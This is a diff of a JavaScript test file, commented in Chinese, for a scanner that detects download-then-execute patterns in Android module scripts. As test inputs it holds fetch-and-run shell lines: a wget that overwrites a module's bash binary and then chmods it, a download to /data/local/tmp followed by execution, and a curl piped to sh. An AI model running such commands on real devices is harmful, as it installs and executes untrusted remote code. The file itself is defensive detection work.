+  assert.ok(rule, 'DOWNLOAD_TO_MODULE_EXEC 必须进 RULES_BY_ID');
+  assert.ok(CONTENT_RULES.includes(rule), '不进 CONTENT_RULES 的话 scanContent 根本不会跑它');
+  assert.equal(rule.severity, 'high');
+  assert.equal(rule.category, 'execution', '不许新造 category');
+  assert.equal(rule.anchor, 'anywhere');
+  assert.equal(rule.anchorSibling, null);
+  assert.equal(rule.pattern, null, '跨行规则的匹配不住在单个正则上');
+  assert.ok(rule.title && rule.advice);
+  assert.notEqual(rule.title, RULES_BY_ID.DOWNLOAD_THEN_EXEC.title,
+    '两个不同的主张不许共用一句标题');
+  assert.notEqual(rule.advice, RULES_BY_ID.DOWNLOAD_THEN_EXEC.advice, 'advice 也各自单独写');
+  const h = rule.scan('service.sh', t31body(T31_SHEBANG,
+    '    wget -qO "$MODPATH/system/bin/bash" "$url"',
+    '    chmod 0755 "$MODPATH/system/bin/bash"'));
+  assert.equal(h.length, 1, JSON.stringify(h));
+  assert.deepEqual(Object.keys(h[0]).sort(),
+    ['advice', 'category', 'file', 'line', 'message', 'ruleId', 'severity', 'snippet'].sort(),
+    'Finding 字段与工厂逐一对齐');
+  assert.equal(h[0].message, rule.title);
+  assert.equal(h[0].ruleId, 'DOWNLOAD_TO_MODULE_EXEC');
+  assert.equal(h[0].file, 'service.sh');
+  assert.ok(!/\s\s/.test(h[0].snippet), `snippet 必须由 trimSnippet 压平：${JSON.stringify(h[0].snippet)}`);
+  assert.equal(JSON.stringify(rule.scan('x.sh', h[0].snippet)), JSON.stringify(rule.scan('x.sh', h[0].snippet)),
+    '纯函数：同输入两次逐字节一致');
+  assert.equal(typeof redactText(t31body(T31_SHEBANG,
+    '    wget -qO "$MODPATH/system/bin/bash" "$url"')), 'string', '脱敏通道不许因为 pattern:null 崩掉');
+});
+
+test('T3.1-D9 老判据一字未动：DOWNLOAD_THEN_EXEC 的 severity/category/pattern/anchor 与跨文件、让位口径都不变', () => {
+  const rule = RULES_BY_ID.DOWNLOAD_THEN_EXEC;
+  assert.equal(rule.severity, 'high');
+  assert.equal(rule.category, 'execution');
+  assert.equal(rule.pattern, null);
+  assert.equal(rule.anchor, 'anywhere');
+  assert.ok(rule.title && rule.advice);
+  // 跨文件仍然不报（本轮没有新增跨文件能力）
+  const one = hits('DOWNLOAD_THEN_EXEC', t31body(T31_SHEBANG, 'wget -qO /data/local/tmp/u "$url"'), 'install.sh');
+  const other = hits('DOWNLOAD_THEN_EXEC', t31body(T31_SHEBANG, 'sh /data/local/tmp/u'), 'service.sh');
+  assert.deepEqual(one.map((f) => f.line), [], 'install.sh 只下载');
+  assert.deepEqual(other.map((f) => f.line), [], 'service.sh 只执行：本规则看不到 install.sh 的 sink');
+  // 新规则同样只吃单篇文本
+  assert.deepEqual(t31mod(t31body(T31_SHEBANG, '    wget -qO "$MODPATH/system/bin/bash" "$url"'), 'install.sh'), [],
+    '只有落地、没有同篇文本里的加执行位 ⇒ 不报');
+  // 管道那一行仍然只归 PIPE_TO_SHELL：本轮没动让位规则
+  assert.deepEqual(hits('PIPE_TO_SHELL', t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')).map((f) => f.line), [2]);
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG, 'curl -s https://x.dev/a | sh')), []);
 });
